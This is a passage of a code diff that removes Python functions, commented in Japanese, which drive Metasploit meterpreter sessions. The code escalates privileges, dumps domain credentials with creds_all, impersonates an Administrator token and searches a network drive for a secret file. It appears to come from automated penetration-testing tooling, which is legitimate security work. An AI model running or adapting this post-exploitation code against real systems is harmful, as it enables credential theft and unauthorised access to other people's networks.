-    
-    print("domain account list = {}".format(domain_account))
-
-    domain_account.clear()
-
-
-  # creds tspkg からドメインアカウントとパスワードを取得
-  def execute_creds_tspkg2(self):
-    client = self.msf_connection()
-
-    session_num = "5"
-
-    # kiwi にて creds tspkg コマンド実行
-    #client.sessions.session(session_num).write('load kiwi')
-    #time.sleep(20)
-    #print(client.sessions.session(session_num).read())
-
-    client.sessions.session(session_num).write('getsystem')
-    time.sleep(20)
-    print(client.sessions.session(session_num).read())
-    
-    client.sessions.session(session_num).write('creds_all')
-    time.sleep(10)
-    result = client.sessions.session(session_num).read()
-    print(result)
-
-    rows = result.splitlines()
-    domain_list = []
-    flag = 0
-    
-    for row in rows:
-      # ユーザアカウントの取得
-      if flag == 1:
-        #print(row)
-        domain_list += row.split()
-      # 開始判定
-      if '-------' in row:
-        flag = 1
-    flag = 0
-    
-    print("domain password = {}".format(domain_list))
-    
-    domain_list.clear()
-
-
-  # ネットワークドライブの機密情報を取得
-  def execute_getnwsecretinfo2(self):
-    client = self.msf_connection()
-
-    session_num = "5"
-
-    print("execute get secretfile into network drive..")
-
-    # nwdrv を取得する
-
-    secret_data = -1 # 発見できなかった場合は、-1
-
-    # test
-    client.sessions.session(session_num).write('getuid')
-    time.sleep(10)
-    print(client.sessions.session(session_num).read())
-
-    #client.sessions.session(session_num).write('load incognito')
-    #time.sleep(10)
-    #print(client.sessions.session(session_num).read())
-
-    client.sessions.session(session_num).write('list_tokens -u')
-    time.sleep(20)
-    print(client.sessions.session(session_num).read())
-
-    client.sessions.session(session_num).write('impersonate_token ONIGIRI\\\\\Administrator')
-    #client.sessions.session(session_num).write('impersonate_token NT AUTHORITY\\\\SYSTEM')
-    time.sleep(20)
-
-    client.sessions.session(session_num).write('getuid')
-    time.sleep(10)
-    print(client.sessions.session(session_num).read())
-
-    client.sessions.session(session_num).write('cd Z:')
-    time.sleep(10)
-    print(client.sessions.session(session_num).read())
-
-    client.sessions.session(session_num).write('dir')
-    time.sleep(10)
-    result = client.sessions.session(session_num).read()
-
-    rows = result.splitlines()
-    print(rows)
-
-    for row in rows:
-      if "mushikago_secret" in row: # 発見した場合
-        print("find secret_data = {}".format(row))
-        secret_data = 1
-        break
-    
-    print("secret_data = {}".format(secret_data))
-
-    return secret_data
